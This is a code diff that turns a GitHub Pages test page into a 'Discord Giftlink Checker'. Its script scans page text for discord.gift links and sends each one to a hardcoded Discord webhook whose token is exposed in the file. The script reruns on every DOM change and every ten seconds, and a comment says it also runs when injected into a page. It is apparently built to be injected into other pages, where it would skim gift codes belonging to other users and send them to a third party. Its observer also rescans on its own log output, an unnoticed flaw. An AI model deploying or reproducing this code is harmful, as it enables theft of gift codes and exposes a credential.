@@ -1,10 +1,267 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Test Page</title>
+    <meta charset="UTF-8">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <base href="/">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Giftlink Checker</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+            padding: 20px;
+            background-color: #f0f0f0;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        h1 {
+            color: #5865F2;
+            text-align: center;
+        }
+        .log {
+            margin-top: 20px;
+            padding: 10px;
+            background-color: #2b2d31;
+            color: white;
+            border-radius: 5px;
+            max-height: 300px;
+            overflow-y: auto;
+            font-family: monospace;
+            white-space: pre-wrap;
+        }
+        .status {
+            margin-top: 10px;
+            padding: 10px;
+            border-radius: 5px;
+        }
+        .success {
+            background-color: #d4edda;
+            color: #155724;
+        }
+        .error {
+            background-color: #f8d7da;
+            color: #721c24;
+        }
+        .info {
+            background-color: #d1ecf1;
+            color: #0c5460;
+        }
+    </style>
 </head>
 <body>
-    <h1>GitHub Pages Test</h1>
-    <p>If you see this, GitHub Pages is working!</p>
+    <div class="container">
+        <h1>Discord Giftlink Checker</h1>
+        <p>This tool automatically scans the page for Discord gift links and sends them to a predefined webhook.</p>
+        
+        <div id="status" class="status info">Scanning for gift links...</div>
+        
+        <h3>Logs:</h3>
+        <div id="log" class="log"></div>
+    </div>
+
+    <script>
+        // Configuration
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1535632574624432208/5HY97CzhCjZ_dpd3Tv2uLtkcrsoNFpr3XNJqLDQ9_FIaBUENAuE89TaA4m-wkRWzwEj3";
+        const DISCORD_GIFT_LINK_REGEX = /https:\/\/discord\.gift\/[A-Za-z0-9]+/g;
+        
+        // Rate limiting: Minimum delay between webhook sends (in milliseconds)
+        const RATE_LIMIT_DELAY = 2000;
+        
+        // Track sent links to avoid duplicates
+        const sentLinks = new Set();
+        
+        // Log messages to the UI and console
+        function logMessage(message, type = "info") {
+            const logElement = document.getElementById("log");
+            const timestamp = new Date().toISOString();
+            const formattedMessage = `[${timestamp}] ${message}`;
+            
+            // Add to UI log
+            const logEntry = document.createElement("div");
+            logEntry.textContent = formattedMessage;
+            logEntry.className = type;
+            logElement.appendChild(logEntry);
+            
+            // Scroll to bottom
+            logElement.scrollTop = logElement.scrollHeight;
+            
+            // Add to console
+            switch (type) {
+                case "success":
+                    console.log(`%c${formattedMessage}`, "color: green");
+                    break;
+                case "error":
+                    console.error(`%c${formattedMessage}`, "color: red");
+                    break;
+                default:
+                    console.log(`%c${formattedMessage}`, "color: blue");
+            }
+        }
+        
+        // Update status message
+        function updateStatus(message, type = "info") {
+            const statusElement = document.getElementById("status");
+            statusElement.textContent = message;
+            statusElement.className = `status ${type}`;
+        }
+        
+        // Send a link to the webhook
+        async function sendToWebhook(link) {
+            try {
+                const payload = {
+                    content: `🎁 **Discord Gift Link Found:** ${link}`,
+                    embeds: [
+                        {
+                            title: "Gift Link Detected",
+                            description: `A valid Discord gift link was found: [${link}](${link})`,
+                            color: 0x5865F2,
+                            fields: [
+                                {
+                                    name: "Link",
+                                    value: link,
+                                    inline: true
+                                },
+                                {
+                                    name: "Status",
+                                    value: "Valid Format",
+                                    inline: true
+                                }
+                            ],
+                            timestamp: new Date().toISOString()
+                        }
+                    ]
+                };
+                
+                const response = await fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify(payload)
+                });
+                
+                if (response.ok) {
+                    logMessage(`✅ Successfully sent link to webhook: ${link}`, "success");
+                    return true;
+                } else {
+                    logMessage(`❌ Failed to send link to webhook: ${link} (HTTP ${response.status})`, "error");
+                    return false;
+                }
+            } catch (error) {
+                logMessage(`❌ Error sending link to webhook: ${link} (${error.message})`, "error");
+                return false;
+            }
+        }
+        
+        // Scan the DOM for Discord gift links
+        function scanForGiftLinks() {
+            updateStatus("Scanning DOM for gift links...", "info");
+            logMessage("Starting DOM scan for Discord gift links...");
+            
+            const allText = document.body.textContent || document.body.innerText;
+            const matches = allText.match(DISCORD_GIFT_LINK_REGEX) || [];
+            
+            // Extract unique links
+            const uniqueLinks = [...new Set(matches)];
+            
+            if (uniqueLinks.length === 0) {
+                updateStatus("No gift links found.", "error");
+                logMessage("No Discord gift links found in the DOM.", "error");
+                return;
+            }
+            
+            logMessage(`Found ${uniqueLinks.length} unique gift link(s): ${uniqueLinks.join(", ")}`, "success");
+            updateStatus(`Found ${uniqueLinks.length} gift link(s). Sending to webhook...`, "info");
+            
+            // Send each link to the webhook with rate limiting
+            let index = 0;
+            const sendNext = async () => {
+                if (index >= uniqueLinks.length) {
+                    updateStatus("All links processed.", "success");
+                    logMessage("All gift links have been processed.", "success");
+                    return;
+                }
+                
+                const link = uniqueLinks[index];
+                index++;
+                
+                // Skip if already sent
+                if (sentLinks.has(link)) {
+                    logMessage(`⏭️ Skipping already sent link: ${link}`, "info");
+                    await new Promise(resolve => setTimeout(resolve, RATE_LIMIT_DELAY));
+                    await sendNext();
+                    return;
+                }
+                
+                // Mark as sent
+                sentLinks.add(link);
+                
+                // Send to webhook
+                const success = await sendToWebhook(link);
+                
+                // Wait before sending the next link
+                await new Promise(resolve => setTimeout(resolve, RATE_LIMIT_DELAY));
+                
+                // Process next link
+                await sendNext();
+            };
+            
+            // Start sending
+            sendNext();
+        }
+        
+        // Scan for links in dynamically loaded content (e.g., AJAX, SPAs)
+        function setupMutationObserver() {
+            const observer = new MutationObserver((mutations) => {
+                mutations.forEach((mutation) => {
+                    if (mutation.addedNodes.length > 0) {
+                        logMessage("New DOM nodes detected. Rescanning for gift links...", "info");
+                        scanForGiftLinks();
+                    }
+                });
+            });
+            
+            observer.observe(document.body, {
+                childList: true,
+                subtree: true,
+                characterData: true
+            });
+            
+            logMessage("MutationObserver set up to detect dynamically loaded content.", "info");
+        }
+        
+        // Initialize the checker
+        function init() {
+            logMessage("Initializing Discord Giftlink Checker...", "info");
+            updateStatus("Initializing...", "info");
+            
+            // Scan immediately
+            scanForGiftLinks();
+            
+            // Set up observer for dynamic content
+            setupMutationObserver();
+            
+            // Periodically rescan (every 10 seconds)
+            setInterval(() => {
+                logMessage("Periodic rescan for gift links...", "info");
+                scanForGiftLinks();
+            }, 10000);
+        }
+        
+        // Start the checker when the page loads
+        window.addEventListener("load", init);
+        
+        // Also run if the script is injected dynamically
+        if (document.readyState === "complete" || document.readyState === "interactive") {
+            init();
+        }
+    </script>
 </body>
 </html>
